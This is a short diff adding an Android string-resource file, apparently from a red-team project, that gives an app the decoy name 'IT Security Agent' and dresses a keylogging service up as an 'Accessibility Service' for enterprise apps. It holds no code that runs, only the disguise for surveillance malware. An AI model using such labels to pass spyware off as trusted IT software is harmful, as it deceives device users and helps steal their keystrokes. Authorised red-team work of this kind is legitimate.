@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <!-- Red team delivery name — looks like a legitimate IT-pushed app -->
+    <string name="app_name">IT Security Agent</string>
+    <string name="keylog_service_label">Accessibility Service</string>
+    <string name="keylog_service_desc">Provides accessibility support for enterprise applications</string>
+</resources>
